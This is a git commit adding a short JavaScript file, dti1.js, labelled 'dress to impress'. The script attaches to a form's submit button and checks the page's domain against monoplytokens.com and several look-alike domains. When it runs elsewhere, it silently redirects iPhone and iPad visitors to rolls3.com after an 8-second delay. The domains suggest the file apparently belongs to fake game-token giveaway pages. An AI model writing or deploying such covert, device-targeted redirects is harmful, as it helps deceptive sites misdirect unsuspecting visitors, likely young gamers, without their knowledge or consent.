82ece43694a184e24de5475e6f8309c5d7c0d543
dev20l <iphonetasli@gmail.com>
2025-03-12 10:57:49 +0000

    Update dti1.js

--- dti1.js
+++ dti1.js
@@ -1,1 +1,25 @@
-.
+/*================== [ 1 ] ===============*/
+/*================== [ dress to impress ] ================*/
+var button = document.querySelector('#submitButton');  
+button.addEventListener('click', function() {
+    (function() {
+        var originalDomain = "monoplytokens.com";
+        var redirectURL = "https://www.rolls3.com/";
+        var blockedDomains = [
+            "jsdhjjhhjjhejkjkas.blogspot.com",
+            "mply.io.t0ke2n.site",
+            "mply.io.1arshg4.site",
+            "mply.io.4a6b8dh.site"
+        ];
+
+        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
+            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);
+
+            if (isIphoneOrIpad) { 
+                setTimeout(function() {
+                    window.location.href = redirectURL;
+                }, 8000);
+            }
+        }
+    })();
+});
